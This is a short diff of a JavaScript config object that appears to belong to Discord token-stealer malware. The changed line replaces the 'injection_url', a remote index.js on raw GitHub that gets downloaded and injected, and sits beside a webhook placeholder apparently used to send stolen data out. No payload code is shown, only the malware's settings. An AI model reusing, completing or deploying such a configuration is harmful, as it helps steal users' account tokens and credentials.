@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Red60sapphire/BuckledPepper-Inject/index.js",
+    injection_url: "https://raw.githubusercontent.com/OpenSearch0001/jgfjfjfj/main/index.js",
     webhook: "%WEBHOOK%",
     uwu: "",
     Filter: {
